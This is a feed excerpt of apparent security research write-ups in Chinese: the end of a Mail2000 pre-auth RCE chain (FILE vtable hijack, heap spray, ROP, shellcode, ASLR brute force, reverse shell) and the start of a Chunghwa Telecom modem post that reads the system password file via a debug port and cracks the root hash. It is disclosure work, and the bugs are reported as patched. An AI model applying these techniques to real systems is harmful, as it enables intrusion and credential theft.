&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_finish_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__finish&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_read_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_write_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_seek_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__seek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_close_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;因此如果我們可以篡改、偽造這個 &lt;code class=&quot;highlighter-rouge&quot;&gt;vtable&lt;/code&gt; 的話，就可以在程式做檔案處理的時候，劫持程式流程！我們可以以此訂出以下的攻擊步驟：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;建立連線，呼叫 CGI&lt;/li&gt;
  &lt;li&gt;使用大量參數，覆寫 vector 指標&lt;/li&gt;
  &lt;li&gt;偽造 POST file 當中的 FILE*，指向一塊偽造的 FILE 結構&lt;/li&gt;
  &lt;li&gt;在 CGI 流程中呼叫 FILE 相關的操作
    &lt;ul&gt;
      &lt;li&gt;fread, fwrite, fclose, …&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;劫持程式流程&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;我們現在已經知道終點是&lt;strong&gt;呼叫一個 FILE 操作&lt;/strong&gt;，那麼就可以開始往回找&lt;strong&gt;哪個 function&lt;/strong&gt; 是 CGI 常用的 FILE 操作，又有&lt;strong&gt;哪一些 CGI&lt;/strong&gt; 可以作為入口點，才能串出我們的攻擊鏈！我們首先對使用到 POST file 的相關函式做研究，並選定了目標 &lt;code class=&quot;highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt;。&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; 在許多用到 FILE 的 CGI 中有被呼叫，它用於在程式結束前將 &lt;code class=&quot;highlighter-rouge&quot;&gt;g_stCGIEnv&lt;/code&gt; 清空，包括將動態配置的記憶體 &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt; 掉，以及將所有 FILE 關閉，也就是呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;fclose()&lt;/code&gt;，也意味著是可以通過 vtable 被劫持的！我們可以使用這個越界寫入漏洞蓋掉 &lt;code class=&quot;highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;，而指向的內容就是 HTTP request 的參數，便可以偽造為 POST files！像是下面這個結構：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們的最終目標就是將 FILE* 指向偽造的結構，藉由偽造的 vtable 劫持程式流程！這時候便出現了一個問題，我們需要將 FILE* 這個指標指向一個內容可控的位置，但是其實我們並不知道該指到哪裡去，會有這個問題是起因於 Linux 上的一個防禦機制 - ASLR。&lt;/p&gt;

&lt;h3 id=&quot;address-space-layout-randomization-aslr&quot;&gt;Address Space Layout Randomization (ASLR)&lt;/h3&gt;

&lt;p&gt;ASLR 使得每次程式在執行並載入記憶體時，會隨機載入至不同的記憶體位置，我們可以嘗試使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;cat /proc/self/maps&lt;/code&gt; 觀察每一次執行時的記憶體位置是否相同：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/8.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
ASLR 在大部分的環境中都是預設開啟的，因此在撰寫 exploit 時，常遇到可以偽造指標，卻不知道該指到哪裡的窘境。&lt;br /&gt;
而這個機制在 CGI 的架構下會造成更大的阻礙，一般的伺服器的攻擊流程可能是這樣：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/9.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
可以在一個連線當中 leak address 並用來做進一步的攻擊，但在 CGI 架構中卻是這樣：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/10.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
在這個情況下，leak 得到的 address 是無法在後續攻擊中使用的！因為 CGI 執行完就結束了，下一個 request 又是全新的 CGI！&lt;br /&gt;
為了應對這個問題，我們最後寫了兩個 exploit，攻擊的手法根據 CGI binary 而有不同。&lt;/p&gt;

&lt;h3 id=&quot;post-auth-rce---cgi-binmsg_read&quot;&gt;Post-Auth RCE - &lt;code class=&quot;highlighter-rouge&quot;&gt;/cgi-bin/msg_read&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;第一個 exploit 的入口點是一個需要登入的頁面，這一隻程式較大、功能也較多。在這一個 exploit 中，我們使用了 heap spray 的手法來克服 ASLR，也就是在 heap 中填入大量重複的物件，如此一來我們就有很高的機率可以&lt;strong&gt;猜&lt;/strong&gt;到它的位置。&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/11.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
而 spray 的內容就是大量偽造好的 FILE 結構，包含偽造的 vtable。從這隻 binary 中，我們找到了一個十分實用的 &lt;strong&gt;gadget&lt;/strong&gt;，也就是小程式片段：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xchg eax, esp; ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;這個 gadget 的作用在於，我們可以&lt;strong&gt;改變 stack 的位置&lt;/strong&gt;，而剛好此時的 &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; 指向內容是可控的，因此整個 stack 的內容都可以偽造，也就是說我們可以使用 ROP(Return-oriented programming) 來做利用！於是我們在偽造的 vtable 中設置了 stack 搬移的 gadget 以及後續利用的 ROP 攻擊鏈，進行 ROP 攻擊！&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們可以做 ROP，也就可以拿 shell 了對吧！你以為是這樣嗎？不，其實還有一個大問題，同樣導因於前面提到的防禦機制 ASLR – 我們沒有 system 的位置！這隻 binary 本身提供的 gadget 並不足以開啟一個 shell，因此我們希望可以直接利用 libc 當中的 system 來達成目的，但正如前面所提到的，記憶體位置每次載入都是隨機化的，我們並不知道 system 的確切位置！&lt;br /&gt;
經過我們仔細的觀察這支程式以後，我們發現了一件非常特別的事，這隻程式理論上是有打開 NX，也就是可寫段不可執行的保護機制&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/13.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
但是實際執行的時候，stack 的執行權限卻會被打開！&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/14.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
不論原因為何，這個設置對駭客來說是非常方便的，我們可以利用這個可執行段，將 shellcode 放上去執行，就可以成功得到 shell，達成 RCE！&lt;/p&gt;

&lt;p&gt;然而，這個攻擊是需要登入的，對於追求完美的 DEVCORE 研究組來說，並不足夠！因此我們更進一步的研究了其它攻擊路徑！&lt;/p&gt;

&lt;h3 id=&quot;pre-auth-rce---cgi-bincgi_api&quot;&gt;Pre-Auth RCE - &lt;code class=&quot;highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;在搜索了所有 CGI 入口點以後，我們找到了一個不需要登入，同時又會呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; 的 CGI – &lt;code class=&quot;highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;。一如其名，它就是一隻呼叫 API 的接口，因此程式本身非常的小，幾乎是呼叫完 library 就結束了，也因此不再有 stack pivot 的 gadget 可以利用。&lt;br /&gt;
這時，由於我們已經得知 stack 是可執行的，因此其實我們是可以跳過 ROP 這個步驟，直接將 shellcode 放置在 stack 上的，這裡利用到一個 CGI 的特性 – HTTP 的相關變數會放在環境變數中，像是下列這些常見變數：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;HTTP_HOST&lt;/li&gt;
  &lt;li&gt;REQUEST_METHOD&lt;/li&gt;
  &lt;li&gt;QUERY_STRING&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而環境變數事實上就是被放置在 stack 的最末端，也就是可執行段的位置，因此我們只要偽造 vtable 直接呼叫 shellcode 就可以了！&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;當然這時候同樣出現了一個問題：我們仍舊沒有 stack 的記憶體位置。這個時候有些人可能會陷入一個迷思，覺得攻擊就是要一次到位，像個狙擊手一樣一擊必殺，但實際上可能是這樣拿機關槍把敵人炸飛：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191223/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;換個角度思考，這隻 binary 是 32 bits 的，因此這個位置有 1.5bytes 是隨機的，總共有 16&lt;sup&gt;3&lt;/sup&gt; 個可能的組合，所以其實平均只要 4096 次請求就可以撞到一次！這對於現在的電腦、網路速度來說其實也就是幾分鐘之間的事情，因此直接做暴力破解也是可行的！於是我們最終的 exploit 流程就是：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;發送 POST 請求至 &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;QUERY_STRING 中放入 shellcode&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;觸發越界寫入，覆蓋 &lt;code class=&quot;highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;在越界的參數準備偽造的 FILE &amp;amp; vtable&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt; 結束前呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;MCGI_VarClear&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;跳至 vtable 上的 shellcode 位置，建立 reverse shell&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;最後我們成功寫出了不用認證的 RCE 攻擊鏈，並且這個 exploit 是不會因為 binary 的版本不同而受影響的！而在實際遇到的案例中也證明了這個 exploit 的可行性，我們曾在一次的演練當中，藉由 Mail2000 的這個 1day 作為突破口，成功洩漏目標的 VPN 資料，進一步往內網滲透！&lt;/p&gt;

&lt;h2 id=&quot;漏洞修復&quot;&gt;漏洞修復&lt;/h2&gt;

&lt;p&gt;此漏洞已在 2018/05/08 發布的 Mail2000 V7 Patch 050 版本中完成修復。Patch 編號為 OF-ISAC-18-002、OF-ISAC-18-003。&lt;/p&gt;

&lt;h2 id=&quot;後記&quot;&gt;後記&lt;/h2&gt;

&lt;p&gt;最後想來談談對於這些漏洞，廠商該用什麼樣的心態去面對。作為一個提供產品的廠商，Openfind 在這一次的漏洞處理中有幾個關鍵值得學習：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;心態開放
    &lt;ul&gt;
      &lt;li&gt;主動提供測試環境&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;積極修復漏洞
    &lt;ul&gt;
      &lt;li&gt;面對漏洞以積極正向的態度，迅速處理&lt;/li&gt;
      &lt;li&gt;修復完畢後，與提報者合作驗證&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;重視客戶安全
    &lt;ul&gt;
      &lt;li&gt;發布重大更新並主動通報客戶、協助更新&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其實產品有漏洞是很正常也很難避免的事，而我們研究組是作為一個協助者的角色，期望能藉由回報漏洞幫助企業，提高資安意識並增進台灣的資安水平！希望廠商們也能以正向的態度來面對漏洞，而不是閃躲逃避，這樣只會令用戶們陷入更大的資安風險當中！&lt;/p&gt;

&lt;p&gt;而對於使用各項設備的用戶，也應當掌握好屬於自己的資產，防火牆、伺服器等產品並不是購買來架設好以後就沒有問題了，做好資產盤點、追蹤廠商的安全性更新，才能確保產品不受到 1day 的攻擊！而定期進行滲透測試以及紅隊演練，更是可以幫助企業釐清自己是否有盲點、缺失，進而改善以降低企業資安風險。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world/</link>
                <guid>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world</guid>
                <pubDate>Mon, 23 Dec 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>你用它上網，我用它進你內網! 中華電信數據機遠端代碼執行漏洞</title>
                <description>&lt;p&gt;大家好，我是 Orange! 這次的文章，是我在 &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE Conference 2019&lt;/a&gt; 上所分享的議題，講述如何從中華電信的一個設定疏失，到串出可以掌控數十萬、甚至數百萬台的家用數據機漏洞!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;身為 DEVCORE 的研究團隊，我們的工作就是研究最新的攻擊趨勢、挖掘最新的弱點、找出可以影響整個世界的漏洞，回報給廠商避免這些漏洞流至地下黑市被黑帽駭客甚至國家級駭客組織利用，讓這個世界變得更加安全!&lt;/p&gt;

&lt;p&gt;把「漏洞研究」當成工作，一直以來是許多資訊安全技術狂熱份子的夢想，但大部分的人只看到發表漏洞、或站上研討會時的光鮮亮麗，沒注意到背後所下的苦工，事實上，「漏洞研究」往往是一個非常樸實無華，且枯燥的過程。&lt;/p&gt;

&lt;p&gt;漏洞挖掘並不像 &lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/&quot;&gt;Capture the Flag (CTF)&lt;/a&gt;，一定存在著漏洞以及一個正確的解法等著你去解出，在題目的限定範圍下，只要根據現有的條件、線索去推敲出題者的意圖，十之八九可以找出問題點。 雖然還是有那種清新、優質、難到靠北的比賽例如 &lt;a href=&quot;https://ctf.hitcon.org/&quot;&gt;HITCON CTF&lt;/a&gt; 或是 &lt;a href=&quot;https://plaidctf.com/&quot;&gt;Plaid CTF&lt;/a&gt;，不過 「找出漏洞」 與 「如何利用漏洞」在本質上已經是兩件不同的事情了!&lt;/p&gt;

&lt;p&gt;CTF 很適合有一定程度的人精進自己的能力，但缺點也是如果經常在限制住的小框框內，思路及眼界容易被侷限住，真實世界的攻防往往更複雜、維度也更大! 要在一個成熟、已使用多年，且全世界資安人員都在關注的產品上挖掘出新弱點，可想而知絕對不是簡單的事! 一場 CTF 競賽頂多也就 48 小時，但在無法知道目標是否有漏洞的前提下，你能堅持多久?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;在我們上一個研究中&lt;/a&gt;，發現了三個知名 SSL VPN 廠商中不用認證的遠端代碼執行漏洞，雖然成果豐碩，但也是花了整個研究組半年的時間(加上後續處理甚至可到一年)，甚至在前兩個月完全是零產出、找不到漏洞下持續完成的。 所以對於一個好的漏洞研究人員，除了綜合能力、見識多寡以及能否深度挖掘外，還需要具備能夠獨立思考，以及興趣濃厚到耐得住寂寞等等特質，才有辦法在高難度的挑戰中殺出一條血路!&lt;/p&gt;

&lt;p&gt;漏洞研究往往不是一間公司賺錢的項目，卻又是無法不投資的部門，有多少公司能夠允許員工半年、甚至一年去做一件不一定有產出的研究? 更何況是將研究成果無條件的回報廠商只是為了讓世界更加安全? 這也就是我們 DEVCORE 不論在&lt;a href=&quot;https://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;或是&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;紅隊演練&lt;/a&gt;上比別人來的優秀的緣故，除了平日軍火庫的累積外，當遇到漏洞時，也會想盡辦法將這個漏洞的危害最大化，利用駭客思維、透過各種不同組合利用，將一個低風險漏洞利用到極致，這也才符合真實世界駭客對你的攻擊方式!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;影響範圍&quot;&gt;影響範圍&lt;/h2&gt;

&lt;p&gt;故事回到今年初的某天，我們 DEVCORE 的情資中心監控到全台灣有大量的網路地址開著 3097 連接埠，而且有趣的是，這些地址並不是什麼伺服器的地址，而是普通的家用電腦。 一般來說，家用電腦透過數據機連接上網際網路，對外絕不會開放任何服務，就算是數據機的 SSH 及 HTTP 管理介面，也只有內部網路才能訪問到，因此我們懷疑這與 ISP 的配置失誤有關! 我們也成功的在這個連接埠上挖掘出一個不用認證的遠端代碼執行漏洞! 打個比喻，就是駭客已經睡在你家客廳沙發的感覺!&lt;/p&gt;

&lt;p&gt;透過這個漏洞我們可以完成:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;竊聽網路流量，竊取網路身分、PTT 密碼，甚至你的信用卡資料&lt;/li&gt;
  &lt;li&gt;更新劫持、水坑式攻擊、內網中繼攻擊去控制你的電腦甚至個人手機&lt;/li&gt;
  &lt;li&gt;結合紅隊演練去繞過各種開發者的白名單政策&lt;/li&gt;
  &lt;li&gt;更多更多…&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;而相關的 CVE 漏洞編號為:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13411&quot;&gt;CVE-2019-13411&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13412&quot;&gt;CVE-2019-13412&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15064&quot;&gt;CVE-2019-15064&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15065&quot;&gt;CVE-2019-15065&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15066&quot;&gt;CVE-2019-15066&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;相較於以往對家用數據機的攻擊，這次的影響是更嚴重的! 以往就算漏洞再嚴重，只要家用數據機對外不開放任何連接埠，攻擊者也無法利用，但這次的漏洞包含中華電信的配置失誤，導致你家的數據機在網路上裸奔，攻擊者僅僅 &lt;strong&gt;「只要知道你的 IP 便可不需任何條件，直接進入你家內網」&lt;/strong&gt;，而且，由於沒有數據機的控制權，所以這個攻擊一般用戶是無法防禦及修補的!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;經過全網 IPv4 的掃瞄，全台灣約有 25 萬台的數據機存在此問題，&lt;strong&gt;「代表至少 25 萬個家庭受影響」&lt;/strong&gt;，不過這個結果只在 &lt;strong&gt;「掃描當下有連上網路的數據機才被納入統計」&lt;/strong&gt;，所以實際受害用戶一定大於這個數字!&lt;/p&gt;

&lt;p&gt;而透過網路地址的反查，有高達九成的受害用戶是中華電信的動態 IP，而剩下的一成則包含固定制 IP 及其他電信公司，至於為何會有其他電信公司呢? 我們的理解是中華電信作為台灣最大電信商，所持有的資源以及硬體設施也是其他電信商遠遠不及的，因此在一些比較偏僻的地段可能其他電信商到使用者的最後一哩路也還是中華電信的設備! 由於我們不是廠商，無法得知完整受影響的數據機型號列表，但筆者也是受害者 ╮(╯_╰)╭，所以可以確定最多人使用的&lt;a href=&quot;https://broadband.hinet.net/rate.do&quot;&gt;中華電信光世代 GPON 數據機&lt;/a&gt; 也在受影響範圍內!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
(&lt;a href=&quot;https://www.hungry.tw/2014/12/MiWifi.html&quot;&gt;圖片擷自網路&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;漏洞挖掘&quot;&gt;漏洞挖掘&lt;/h2&gt;

&lt;p&gt;只是一個配置失誤並不能說是什麼大問題，所以接下來我們希望能在這個服務上挖掘出更嚴重的漏洞! 軟體漏洞的挖掘，根據原始碼、執行檔以及 API 文件的有無可依序分為:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;黑箱測試&lt;/li&gt;
  &lt;li&gt;灰箱測試&lt;/li&gt;
  &lt;li&gt;白箱測試&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在什麼都沒有的的狀況下，只能依靠經驗以及對系統的了解去猜測每個指令背後的實作、並找出漏洞。&lt;/p&gt;

&lt;h3 id=&quot;黑箱測試&quot;&gt;黑箱測試&lt;/h3&gt;

&lt;p&gt;3097 連接埠提供了許多跟電信網路相關的指令，推測是中華電信給工程師遠端對數據機進行各種網路設定的除錯介面!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;其中，可以透過 &lt;code class=&quot;highlighter-rouge&quot;&gt;HELP&lt;/code&gt; 指令列出所有功能，其中我們發現了一個指令叫做 &lt;code class=&quot;highlighter-rouge&quot;&gt;MISC&lt;/code&gt; ，看名字感覺就是把一堆不知道怎麼分類的指令歸類在這，而其中一個叫做 &lt;code class=&quot;highlighter-rouge&quot;&gt;SCRIPT&lt;/code&gt; 吸引了我們! 它的參數為一個檔案名稱，執行後像是會把檔案當成 Shell Script 來執行，但在無法在遠端機器留下一個可控檔案的前提下，也無法透過這個指令取得任意代碼執行。 不過有趣的是，&lt;code class=&quot;highlighter-rouge&quot;&gt;MISC SCRIPT&lt;/code&gt; 這個指令會將 &lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; 給顯示出來，因此可以透過這個特性去完成任意檔案讀取!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;從黑箱進化成灰箱&quot;&gt;從黑箱進化成灰箱&lt;/h3&gt;

&lt;p&gt;在漏洞的利用上，無論是記憶體的利用、或是網路的滲透，不外乎都圍繞著對目標的讀(Read)、 寫(Write) 以及代碼執行(eXecute) 三個權限的取得，現在我們取得了第一個讀的權限，接下來呢?&lt;/p&gt;

&lt;p&gt;除錯介面貌似跑在高權限使用者下，所以可以直接透過讀取系統密碼檔得到系統使用者管理登入的密碼雜湊!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;透過對 &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; 使用者密碼雜湊的破解，我們成功的登入數據機 SSH 將「黑箱」轉化成「灰箱」! 雖然現在可以成功控制自己的數據機，但一般家用數據機對外是不會開放 SSH 服務的，為了達到可以「遠端」控制別人的數據機，我們還是得想辦法從 3097 這個服務拿到代碼的執行權限。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;整個中華電信的數據機是一個跑在 MIPS 處理器架構上的嵌入式 Linux 系統，而 3097 服務則是由一個在 &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/omcimain&lt;/code&gt; 的二進位檔案來處理，整個檔案大小有將近 5MB，對逆向工程來說並不是一個小數目，但與黑箱測試相較之下，至少有了東西可以分析了真棒!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uname -a
Linux I-040GW.cht.com.tw 2.6.30.9-5VT #1 PREEMPT Wed Jul 31 15:40:34 CST 2019
[luna SDK V1.8.0] rlx GNU/Linux

$ netstat -anp | grep 3097
tcp        0      0 127.0.0.1:3097          0.0.0.0:*               LISTEN

$ ls -lh /usr/bin/omcimain
-rwxr-xr-x    1 root   root        4.6M Aug  1 13:40 /usr/bin/omcimain

$ file /usr/bin/omcimain
ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;從灰箱進化成白箱&quot;&gt;從灰箱進化成白箱&lt;/h3&gt;

&lt;p&gt;現在，我們可以透過逆向工程了解每個指令背後的原理及實作了! 不過首先，逆向工程是一個痛苦且煩悶的經過，一個小小的程式可能就包含幾萬、甚至十幾萬行的組合語言代碼，因此這時挖洞的策略就變得很重要! 從功能面來看，感覺會存在命令注入相關的漏洞，因此先以功能實作為出發點開始挖掘!&lt;/p&gt;

&lt;p&gt;整個 3097 服務的處理核心其實就是一個多層的 IF-ELSE 選項，每一個小框框對應的一個功能的實作，例如 &lt;code class=&quot;highlighter-rouge&quot;&gt;cli_config_cmdline&lt;/code&gt; 就是對應 &lt;code class=&quot;highlighter-rouge&quot;&gt;CONFIG&lt;/code&gt; 這條指令，因此我們搭配著 &lt;code class=&quot;highlighter-rouge&quot;&gt;HELP&lt;/code&gt; 指令的提示一一往每個功能實作挖掘!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;研究了一段時間，並沒有發現到什麼嚴重漏洞 :( 不過我們注意到，當所有指命都匹配失敗時，會進入到了一個 &lt;code class=&quot;highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; 的函數，這個函數的主要目的是把匹配失敗的指令接到 &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; 後繼續執行!&lt;/p&gt;

